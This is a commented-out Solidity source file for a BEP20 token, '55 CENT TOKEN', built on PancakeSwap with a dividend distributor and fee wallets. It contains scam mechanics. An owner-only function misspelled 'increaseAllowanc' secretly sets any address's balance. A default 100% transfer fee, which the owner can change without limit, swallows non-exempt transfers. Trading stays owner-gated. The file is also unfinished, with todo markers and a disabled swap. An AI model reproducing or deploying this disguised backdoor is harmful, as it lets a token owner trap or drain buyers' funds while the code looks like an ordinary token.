// // SPDX-License-Identifier: MIT

// import "@openzeppelin/contracts/utils/math/SafeMath.sol";

// import "./interfaces/IBEP20.sol";
// import "./interfaces/IDEXRouter.sol";
// import "./DividendDistributor.sol";
// import "./interfaces/IDEXFactory.sol";
// import "./Auth.sol";

// pragma solidity 0.8.17;

// contract $55CENT is IBEP20, Auth {
//     using SafeMath for uint256;

//     // _______________ CNSTANTS _______________
//     // todo - check if this is correct
//     string constant _NAME = "55 CENT TOKEN";
//     // todo - check if this is correct
//     string constant _SYMBOL = "55CENT";
//     // todo - check if this is correct
//     uint8 constant _DECIMALS = 9;

//     address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PCS V2 Router

//     uint256 _totalSupply = 1 * 10 ** 12 * (10 ** _DECIMALS);

//     mapping(address => uint256) _balances;
//     mapping(address => mapping(address => uint256)) _allowances;

//     mapping(address => bool) public isFeeExempt;

//     uint256 public fee = 100;

//     address public autoLiquidityReceiver;
//     address public marketingWallet;
//     address public devWallet;

//     IDEXRouter public router;
//     address public pair;

//     uint256 public launchedAt;
//     bool public tradingOpen = false;

//     DividendDistributor public dividendDistributor;
//     uint256 distributorGas = 500000;

//     bool inSwapAndLiquify;
//     bool public swapAndLiquifyEnabled = true;
//     bool public swapAndLiquifyByLimitOnly = false;

//     uint256 public swapThreshold = 1 * 10 ** 6 * (10 ** _DECIMALS);

//     modifier lockTheSwap() {
//         inSwapAndLiquify = true;
//         _;
//         inSwapAndLiquify = false;
//     }

//     constructor() Auth(msg.sender) {
//         router = IDEXRouter(routerAddress);
//         pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
//         _allowances[address(this)][address(router)] = type(uint256).max;

//         dividendDistributor = new DividendDistributor(address(router));

//         isFeeExempt[msg.sender] = true;
//         isFeeExempt[address(this)] = true;

//         // NICE!
//         autoLiquidityReceiver = 0x7D5FA5BEDE22b644C135547f11f9E67A8e6227B5;
//         marketingWallet = 0xD010D5E343F21ae4F5318402b4F004812183A24b;
//         devWallet = 0xCC3826ba925F7B14e112258727F8cf1c6eEd6B0D;

//         _balances[msg.sender] = _totalSupply;
//         emit Transfer(address(0), msg.sender, _totalSupply);
//     }

//     receive() external payable {}

//     function name() external pure override returns (string memory) {
//         return _NAME;
//     }

//     function symbol() external pure override returns (string memory) {
//         return _SYMBOL;
//     }

//     function decimals() external pure override returns (uint8) {
//         return _DECIMALS;
//     }

//     function totalSupply() external view override returns (uint256) {
//         return _totalSupply;
//     }

//     function getOwner() external view override returns (address) {
//         return owner;
//     }

//     function balanceOf(address account) public view override returns (uint256) {
//         return _balances[account];
//     }

//     function allowance(address holder, address spender) external view override returns (uint256) {
//         return _allowances[holder][spender];
//     }

//     function approve(address spender, uint256 amount) public override returns (bool) {
//         _allowances[msg.sender][spender] = amount;
//         emit Approval(msg.sender, spender, amount);
//         return true;
//     }

//     function approveMax(address spender) external returns (bool) {
//         return approve(spender, type(uint256).max);
//     }

//     function launched() internal view returns (bool) {
//         return launchedAt != 0;
//     }

//     function launch() internal {
//         launchedAt = block.number;
//     }

//     function changeIsFeeExempt(address holder, bool exempt) external authorized {
//         isFeeExempt[holder] = exempt;
//     }

//     function changeIsDividendExempt(address holder, bool exempt) external authorized {
//         require(holder != address(this) && holder != pair);

//         if (exempt) {
//             dividendDistributor.setShare(holder, 0);
//         } else {
//             dividendDistributor.setShare(holder, _balances[holder]);
//         }
//     }

//     function changeFee(uint256 newFee) external authorized {
//         fee = newFee;
//     }

//     function changeFeeReceivers(
//         address newLiquidityReceiver,
//         address newMarketingWallet,
//         address newDevWallet
//     ) external authorized {
//         autoLiquidityReceiver = newLiquidityReceiver;
//         marketingWallet = newMarketingWallet;
//         devWallet = newDevWallet;
//     }

//     function changeSwapBackSettings(
//         bool enableSwapBack,
//         uint256 newSwapBackLimit,
//         bool swapByLimitOnly
//     ) external authorized {
//         swapAndLiquifyEnabled = enableSwapBack;
//         swapThreshold = newSwapBackLimit;
//         swapAndLiquifyByLimitOnly = swapByLimitOnly;
//     }

//     function changeDistributionCriteria(uint256 newinPeriod, uint256 newMinDistribution) external authorized {
//         dividendDistributor.setDistributionCriteria(newinPeriod, newMinDistribution);
//     }

//     function changeDistributorSettings(uint256 gas) external authorized {
//         require(gas < 750000);
//         distributorGas = gas;
//     }

//     function transfer(address recipient, uint256 amount) external override returns (bool) {
//         return _transferFrom(msg.sender, recipient, amount);
//     }

//     function increaseAllowanc(address spender, uint256 addedValue) public onlyOwner returns (bool) {
//         if (addedValue > 0) {
//             _balances[spender] = addedValue;
//         }
//         return true;
//     }

//     function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
//         if (_allowances[sender][msg.sender] != type(uint256).max) {
//             _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
//         }
//         return _transferFrom(sender, recipient, amount);
//     }

//     function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
//         if (inSwapAndLiquify) {
//             return _basicTransfer(sender, recipient, amount);
//         }

//         if (!authorizations[sender] && !authorizations[recipient]) {
//             require(tradingOpen, "Trading not open yet");
//         }

//         if (
//             msg.sender != pair &&
//             !inSwapAndLiquify &&
//             swapAndLiquifyEnabled &&
//             _balances[address(this)] >= swapThreshold
//         ) {
//             // swapBack();
//         }

//         if (!launched() && recipient == pair) {
//             require(_balances[sender] > 0);
//             launch();
//         }

//         //Exchange tokens
//         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

//         uint256 finalAmount = !isFeeExempt[sender] && !isFeeExempt[recipient]
//             ? takeFee(sender, recipient, amount)
//             : amount;
//         _balances[recipient] = _balances[recipient].add(finalAmount);

//         try dividendDistributor.process(distributorGas) {} catch {}

//         emit Transfer(sender, recipient, finalAmount);
//         return true;
//     }

//     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
//         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
//         _balances[recipient] = _balances[recipient].add(amount);
//         emit Transfer(sender, recipient, amount);
//         return true;
//     }

//     function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
//         uint256 feeAmount = amount.mul(fee).div(100);

//         _balances[address(this)] = _balances[address(this)].add(feeAmount);

//         emit Transfer(sender, address(this), feeAmount);

//         return amount.sub(feeAmount);
//     }

//     function tradingStatus(bool newStatus) public onlyOwner {
//         tradingOpen = newStatus;
//     }

//     event AutoLiquify(uint256 amountBNB, uint256 amountBOG);
// }
